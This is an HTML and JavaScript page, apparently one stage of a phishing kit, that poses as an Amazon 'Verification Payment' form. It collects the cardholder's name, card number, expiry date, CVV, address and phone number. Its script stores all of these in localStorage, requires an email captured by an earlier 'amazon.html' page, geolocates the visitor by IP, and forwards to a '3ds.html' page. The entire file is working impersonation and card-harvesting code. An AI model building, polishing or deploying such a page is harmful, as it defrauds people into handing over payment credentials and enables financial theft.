<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification Payment</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }
        .logo {
            margin: 10px 0 20px;
            text-align: center;
        }
        .logo img {
            height: 30px;
        }
        .kotak {
            width: 100%;
            max-width: 480px;
            padding: 25px 30px;
            border: 1px solid #ddd;
            border-radius: 4px;
            background: #fff;
        }
        .kotak h1 {
            font-size: 28px;
            font-weight: 400;
            margin-bottom: 20px;
        }
        .bagian-kartu {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        .logo-kartu {
            height: 28px;
            display: none;
        }
        .label {
            font-weight: 700;
            font-size: 13px;
            margin: 15px 0 5px;
            display: block;
        }
        .input {
            width: 100%;
            padding: 7px 12px;
            border: 1px solid #a6a6a6;
            border-radius: 3px;
            font-size: 15px;
            height: 38px;
            outline: none;
        }
        .input:focus {
            border-color: #007185;
            box-shadow: 0 0 0 2px #c8f0f4;
        }
        .baris-dua {
            display: flex;
            gap: 15px;
        }
        .baris-dua > div {
            flex: 1;
        }
        .tombol-lanjut {
            width: 100%;
            padding: 9px 10px;
            background: linear-gradient(to bottom, #f7df89, #ecc000);
            border: 1px solid #a88700;
            border-radius: 8px;
            font-size: 15px;
            cursor: pointer;
            margin: 25px 0 15px;
            height: 40px;
        }
        .tombol-lanjut:disabled {
            background: #e9e9e9;
            border-color: #ccc;
            cursor: not-allowed;
            opacity: 0.7;
        }
        .tombol-lanjut:not(:disabled):hover {
            background: linear-gradient(to bottom, #f5d76e, #d4a300);
        }
        .garis-pemisah {
            border-bottom: 1px solid #e7e7e7;
            margin: 20px 0;
        }
        .bawah {
            margin-top: 30px;
            font-size: 11px;
            color: #555;
            text-align: center;
        }
        .bawah a {
            color: #0066c0;
            text-decoration: none;
            margin: 0 8px;
        }
    </style>
</head>
<body>

    <div class="logo">
        <img src="img/amazonlogo.png" alt="Amazon">
    </div>

    <div class="kotak">
        <h1>Verification Payment</h1>

        <div class="bagian-kartu">
            <img src="img/visa.png" alt="Visa" class="logo-kartu" id="logo-visa">
            <img src="img/mastercard.png" alt="Mastercard" class="logo-kartu" id="logo-master">
            <img src="img/amex.png" alt="Amex" class="logo-kartu" id="logo-amex">
            <img src="img/discover.png" alt="Discover" class="logo-kartu" id="logo-discover">
            <img src="img/jcb.png" alt="JCB" class="logo-kartu" id="logo-jcb">
        </div>

        <label class="label" for="nama_kartu">Name on Card</label>
        <input type="text" id="nama_kartu" class="input" placeholder="Full name">

        <label class="label" for="nomor_kartu">Card Number</label>
        <input type="text" id="nomor_kartu" class="input" placeholder="•••• •••• •••• ••••" maxlength="19">

        <div class="baris-dua">
            <div>
                <label class="label" for="exp_date">Expiration Date</label>
                <input type="text" id="exp_date" class="input" placeholder="MM/YY" maxlength="5">
            </div>
            <div>
                <label class="label" for="cvv">Security Code</label>
                <input type="text" id="cvv" class="input" placeholder="•••" maxlength="4">
            </div>
        </div>

        <label class="label" for="negara">Country or Region</label>
        <select id="negara" class="input"></select>

        <label class="label" for="alamat">Address</label>
        <input type="text" id="alamat" class="input" placeholder="Street address">

        <div class="baris-dua">
            <div>
                <label class="label" for="kota">City</label>
                <input type="text" id="kota" class="input" placeholder="City">
            </div>
            <div>
                <label class="label" for="kode_pos">Postal Code</label>
                <input type="text" id="kode_pos" class="input" placeholder="Postal code">
            </div>
        </div>

        <label class="label" for="telepon">Phone Number</label>
        <input type="tel" id="telepon" class="input" placeholder="+62 xxx xxxx xxxx">

        <button id="tombol-verifikasi" class="tombol-lanjut" disabled>Verification</button>

        <div class="garis-pemisah"></div>
    </div>

    <div class="bawah">
        <p>
            <a href="#">Conditions of Use</a>
            <a href="#">Privacy Notice</a>
            <a href="#">Help</a>
        </p>
    </div>

<script>
const inputNama = document.getElementById('nama_kartu');
const inputNomor = document.getElementById('nomor_kartu');
const inputExp = document.getElementById('exp_date');
const inputCvv = document.getElementById('cvv');
const selectNegara = document.getElementById('negara');
const inputAlamat = document.getElementById('alamat');
const inputKota = document.getElementById('kota');
const inputKodePos = document.getElementById('kode_pos');
const inputTelepon = document.getElementById('telepon');
const tombolVerifikasi = document.getElementById('tombol-verifikasi');

// Daftar negara + kode telepon
const daftarNegara = [
    { kode: 'GB', nama: 'United Kingdom', tel: '+44' },
    { kode: 'ID', nama: 'Indonesia', tel: '+62' },
    { kode: 'US', nama: 'United States', tel: '+1' },
    { kode: 'AU', nama: 'Australia', tel: '+61' },
    { kode: 'MY', nama: 'Malaysia', tel: '+60' },
    { kode: 'JP', nama: 'Japan', tel: '+81' },
    { kode: 'SG', nama: 'Singapore', tel: '+65' },
    { kode: 'CA', nama: 'Canada', tel: '+1' }
];

// Isi pilihan negara
daftarNegara.forEach(n => {
    const opt = document.createElement('option');
    opt.value = n.kode;
    opt.textContent = n.nama;
    selectNegara.appendChild(opt);
});

// Deteksi negara otomatis
window.addEventListener('load', function() {
    // Cek apakah ada data dari halaman sebelumnya
    if (!localStorage.getItem('email_pengguna')) {
        window.location.href = 'amazon.html';
        return;
    }

    // Default UK
    selectNegara.value = 'GB';
    inputTelepon.placeholder = '+44 xxxxx xxxxxx';

    // Deteksi sederhana
    fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
            const kodeNegara = data.country_code;
            if (daftarNegara.some(n => n.kode === kodeNegara)) {
                selectNegara.value = kodeNegara;
                const negara = daftarNegara.find(n => n.kode === kodeNegara);
                inputTelepon.placeholder = `${negara.tel} xxx xxx xxxx`;
            }
        })
        .catch(() => {});
});

// Ubah placeholder telepon saat ganti negara
selectNegara.addEventListener('change', function() {
    const negara = daftarNegara.find(n => n.kode === this.value);
    if (negara) {
        inputTelepon.placeholder = `${negara.tel} xxx xxx xxxx`;
    }
});

// Tampilkan logo kartu sesuai nomor
inputNomor.addEventListener('input', function() {
    let nomor = this.value.replace(/\s/g, '');
    
    // Sembunyikan semua logo
    document.querySelectorAll('.logo-kartu').forEach(l => l.style.display = 'none');
    
    if (/^4/.test(nomor)) {
        document.getElementById('logo-visa').style.display = 'inline-block';
    } else if (/^5[1-5]/.test(nomor)) {
        document.getElementById('logo-master').style.display = 'inline-block';
    } else if (/^3[47]/.test(nomor)) {
        document.getElementById('logo-amex').style.display = 'inline-block';
    } else if (/^6(?:011|5)/.test(nomor)) {
        document.getElementById('logo-discover').style.display = 'inline-block';
    } else if (/^35/.test(nomor)) {
        document.getElementById('logo-jcb').style.display = 'inline-block';
    }

    // Format spasi
    if (nomor.length > 0) {
        let terformat = nomor.match(/.{1,4}/g)?.join(' ') || nomor;
        this.value = terformat;
    }

    cekLengkap();
});

// Format Exp Date otomatis
inputExp.addEventListener('input', function() {
    let val = this.value.replace(/\D/g, '');
    if (val.length >= 2) {
        val = val.slice(0, 2) + '/' + val.slice(2);
    }
    this.value = val;
    cekLengkap();
});

inputCvv.addEventListener('input', cekLengkap);
inputNama.addEventListener('input', cekLengkap);
inputAlamat.addEventListener('input', cekLengkap);
inputKota.addEventListener('input', cekLengkap);
inputKodePos.addEventListener('input', cekLengkap);
inputTelepon.addEventListener('input', cekLengkap);

function cekLengkap() {
    const lengkap = 
        inputNama.value.trim() &&
        inputNomor.value.replace(/\s/g, '').length >= 13 &&
        inputExp.value.length === 5 &&
        inputCvv.value.length >= 3 &&
        inputAlamat.value.trim() &&
        inputKota.value.trim() &&
        inputKodePos.value.trim() &&
        inputTelepon.value.trim();
    
    tombolVerifikasi.disabled = !lengkap;
}

tombolVerifikasi.addEventListener('click', function() {
    // Simpan data kartu
    localStorage.setItem('nama_kartu', inputNama.value.trim());
    localStorage.setItem('nomor_kartu', inputNomor.value.replace(/\s/g, ''));
    localStorage.setItem('exp_kartu', inputExp.value);
    localStorage.setItem('cvv_kartu', inputCvv.value);
    localStorage.setItem('negara_kartu', selectNegara.value);
    localStorage.setItem('alamat_kartu', inputAlamat.value.trim());
    localStorage.setItem('kota_kartu', inputKota.value.trim());
    localStorage.setItem('kodepos_kartu', inputKodePos.value.trim());
    localStorage.setItem('telepon_kartu', inputTelepon.value.trim());

    // Pindah ke halaman 3DS
    window.location.href = '3ds.html';
});
</script>

</body>
</html>
